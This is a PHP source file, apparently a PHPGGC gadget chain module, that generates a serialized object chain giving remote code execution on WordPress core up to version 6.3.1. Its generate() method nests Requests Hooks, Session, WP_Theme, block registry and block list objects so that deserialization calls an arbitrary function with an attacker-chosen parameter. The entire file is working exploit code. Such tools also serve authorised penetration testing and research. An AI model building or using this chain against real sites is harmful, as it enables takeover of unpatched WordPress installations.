<?php

namespace GadgetChain\WordPress;

class RCE1 extends \PHPGGC\GadgetChain\RCE\FunctionCall
{
    public static $version = '<= 6.3.1';
    public static $vector = '__toString';
    public static $author = 'pandhacker';
    public static $information = 'https://wpscan.com/blog/finding-a-rce-gadget-chain-in-wordpress-core/ (@marcs0h)';

    public function generate(array $parameters)
    {
        $function = $parameters['function'];
        $parameter = $parameters['parameter'];

        $blocks = array(
            'Name' => array(
                'blockName' => 'Parent Theme'
            )
        );

        $hooks_recurse_once = new \WpOrg\Requests\Hooks(
            array(
                'http://p:0/Name' => array(
                    array($function)
                )
            )
        );

        $hooks = new \WpOrg\Requests\Hooks(
            array(
                'requests.before_request' => array(
                    array(
                        array(
                            $hooks_recurse_once,
                            'dispatch'
                        )
                    )
                )
            )
        );

        $parent = new \WpOrg\Requests\Session('http://p:0', array($parameter), array('hooks' => $hooks));
        $registered_block_types = new \WP_Theme(null, $parent);
        $registry = new \WP_Block_Type_Registry($registered_block_types);
        $headers = new \WP_Block_List($blocks, $registry);

        return new \WP_Theme($headers);
    }
}
